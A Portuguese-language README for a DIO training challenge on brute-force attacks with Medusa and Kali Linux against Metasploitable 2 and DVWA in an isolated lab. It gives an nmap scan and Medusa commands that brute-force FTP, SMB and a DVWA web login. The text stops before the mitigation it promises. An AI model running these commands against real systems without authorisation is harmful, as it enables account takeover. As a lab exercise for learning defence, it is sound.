# 🛡️ Cybersecurity Challenge: Brute Force com Medusa e Kali Linux

Repositório criado para o desafio de projeto da **DIO (Digital Innovation One)**, focado em simulação de ataques de força bruta, auditoria de serviços e medidas de mitigação em ambientes controlados.

## 📋 Sobre o Desafio
Este projeto demonstra a utilização da ferramenta **Medusa** no **Kali Linux** para realizar ataques de força bruta contra serviços comuns (FTP, SMB e Web) em uma máquina alvo vulnerável (**Metasploitable 2**). O objetivo é entender como esses ataques funcionam para aplicar melhores práticas de defesa.

---

## 🛠️ Ambiente Configurado
* **Atacante:** Kali Linux (Rolling Edition)
* **Alvo:** Metasploitable 2 / DVWA (Damn Vulnerable Web Application)
* **Rede:** Host-Only (Rede Interna Segura no VirtualBox)
* **Ferramentas Utilizadas:**
    * `Nmap`: Reconhecimento e enumeração de serviços.
    * `Medusa`: Framework modular para força bruta em paralelo.
    * `Custom Wordlists`: Listas de usuários e senhas para os testes.

---

## 🚀 Execução dos Testes

### 1. Reconhecimento (Nmap)
Antes de iniciar o ataque, foi realizada a varredura para identificar portas abertas no alvo:
```bash
nmap -sV [IP_DO_ALVO]
medusa -h [IP_DO_ALVO] -u msfadmin -P wordlist_senhas.txt -M ftp

medusa -h [IP_DO_ALVO] -U usuarios.txt -p 123456 -M smbnt

medusa -h [IP_DO_ALVO] -u admin -P wordlist.txt -M http -m DIR:/dvwa/login.php
